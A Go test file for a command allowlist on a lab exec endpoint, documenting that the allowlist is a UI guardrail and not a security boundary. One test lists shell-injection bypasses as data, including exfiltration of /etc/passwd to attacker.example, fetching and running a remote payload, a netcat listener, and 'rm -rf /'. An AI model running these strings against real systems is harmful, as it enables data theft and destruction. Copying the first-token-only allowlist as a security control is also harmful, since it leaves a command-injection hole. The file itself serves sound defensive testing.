package server

import (
	"os"
	"regexp"
	"strings"
	"testing"
)

// TestIsAllowedCommand documents the EXISTING behavior of the
// command-allowlist filter on /api/workshop/nodes/:nodeId/exec.
//
// IMPORTANT — this is not a security boundary. The endpoint passes
// the command through `/bin/sh -c <command>`, so any allowed-prefix
// command followed by shell metacharacters (`;`, `&&`, `|`, `$()`,
// backticks) executes whatever follows. The allowlist exists as a
// UI auto-run guardrail to prevent accidental destructive commands
// from the exercise runner's pre-populated buttons; it does NOT
// restrict what an attacker who can hit the endpoint can do.
//
// The endpoint is safe under the deployment posture documented in
// SECURITY.md (loopback-bound by docker-compose port mapping). If you
// change that posture, the allowlist alone is not sufficient.
//
// These tests pin down the current behavior so regressions in the
// matching logic (e.g., dropping a tool the exercises use, or
// loosening the prefix match in a way that causes the auto-run UI
// to misbehave) get caught.

func TestIsAllowedCommand_ExactMatchesAndPrefixes(t *testing.T) {
	cases := []struct {
		cmd  string
		want bool
		why  string
	}{
		// Bare tool name (exact match) → allowed.
		{"nmap", true, "exact-match: nmap is in allowlist"},
		{"tshark", true, "exact-match: tshark is in allowlist"},
		{"ls", true, "exact-match: ls is in allowlist"},

		// Tool with arguments (prefix + space) → allowed.
		{"nmap -sT 10.40.40.20", true, "prefix: nmap with args"},
		{"mbpoll -m tcp -a 1 -r 1 -c 4 -1 -t 1 10.40.40.20", true, "prefix: real exercise mbpoll command"},
		{"dnp3poll 10.40.40.20:20000 -a 1", true, "prefix: real exercise dnp3poll command"},
		{"iec104cmd 10.30.30.20 gi --json", true, "prefix: EU exercise iec104cmd command"},
		{"iec104cmdx 10.30.30.20", false, "prefix must end at a space"},
		{"curl -s http://10.30.30.20:8080/api/state", true, "prefix: curl with args"},
		{"tshark -r /home/abc/pcaps/baseline.pcap -q -z conv,ip", true, "prefix: real exercise tshark command"},
		{"tcpdump -i any -w /data/captures/baseline.pcap", true, "prefix: real exercise tcpdump command"},

		// Leading whitespace tolerated.
		{"  curl http://example.com", true, "leading whitespace: trimmed before match"},
		{"\tnmap -sT 10.10.10.10", true, "leading tab: trimmed before match"},

		// Tools NOT in the allowlist.
		{"rm -rf /", false, "rm not in allowlist"},
		{"bash", false, "bash not in allowlist"},
		{"sh", false, "sh not in allowlist"},
		{"sudo nmap", false, "sudo prefix isn't allowed even if nmap is"},
		{"docker ps", false, "docker not in allowlist"},
		{"echo hello", false, "echo not in allowlist"},
		{"chmod 777 /", false, "chmod not in allowlist"},

		// Edge: empty / whitespace-only.
		{"", false, "empty string never matches"},
		{"   ", false, "whitespace-only never matches"},

		// Edge: substring match must NOT pass — only prefix-with-space
		// or exact match counts. Otherwise "nmapfoo" would slip through.
		{"nmapfoo", false, "substring (no space after prefix) must reject"},
		{"curlfoo --bar", false, "substring with args must still reject"},
		{"lsx", false, "ls + 'x' is not ls"},

		// Edge: prefix without space at start of a different word
		// shouldn't match either.
		{"x nmap", false, "tool name not at start of command"},
	}

	for _, tc := range cases {
		t.Run(tc.cmd, func(t *testing.T) {
			got := isAllowedCommand(tc.cmd)
			if got != tc.want {
				t.Errorf("isAllowedCommand(%q) = %v, want %v (%s)",
					tc.cmd, got, tc.want, tc.why)
			}
		})
	}
}

// TestIsAllowedCommand_ShellInjectionPasses documents the known
// shell-injection bypass: any allowed prefix followed by shell
// metacharacters slips through. This is intentional given the
// loopback-bound deployment (see SECURITY.md). If anyone tightens
// the allowlist later to also
// reject these, this test should be updated rather than removed —
// it's the explicit pin on "we know about this and accept it under
// the current deployment posture."
func TestIsAllowedCommand_ShellInjectionPasses(t *testing.T) {
	knownBypasses := []string{
		// Allowed prefix + ; <something else> — second command runs.
		"nmap ; rm -rf /",
		"curl http://a.b ; echo done",

		// Allowed prefix + && <something else>.
		"ls && cat /etc/passwd",
		"ping -c 1 1.1.1.1 && nc -lvp 4444",

		// Allowed prefix + pipe.
		"cat /etc/passwd | curl --data-binary @- http://attacker.example",

		// Command substitution after allowed prefix.
		"nmap $(curl http://attacker.example/payload | sh)",
		"curl http://`whoami`.attacker.example",

		// Redirection after allowed prefix.
		"cat /etc/shadow > /tmp/leak",
	}

	for _, bypass := range knownBypasses {
		t.Run(bypass, func(t *testing.T) {
			if !isAllowedCommand(bypass) {
				t.Errorf("isAllowedCommand(%q) = false; expected true under "+
					"the current first-token-only matching. If this test is "+
					"failing because the allowlist was hardened, update the "+
					"test rather than removing it — it pins the documented "+
					"behavior and the safety rationale (loopback binding).",
					bypass)
			}
		})
	}
}

// TestAllowedCommandsCoverExerciseTools reads the UI's runnable grammar rather
// than maintaining a second list of tools. Copy-only examples are not execs.
func TestAllowedCommandsCoverExerciseTools(t *testing.T) {
	source, err := os.ReadFile("../../../frontend/lib/scenario-description.ts")
	if err != nil {
		t.Fatal(err)
	}
	match := regexp.MustCompile(`export const RUN_TOOL_RE = /\^\(([^)]+)\)`).FindSubmatch(source)
	if len(match) != 2 {
		t.Fatal("cannot find frontend Run tool grammar")
	}
	for _, tool := range strings.Split(string(match[1]), "|") {
		if !isAllowedCommand(tool) {
			t.Errorf("UI Run tool %q would return 403; render copy-only, do not expand the backend allowlist", tool)
		}
	}
}
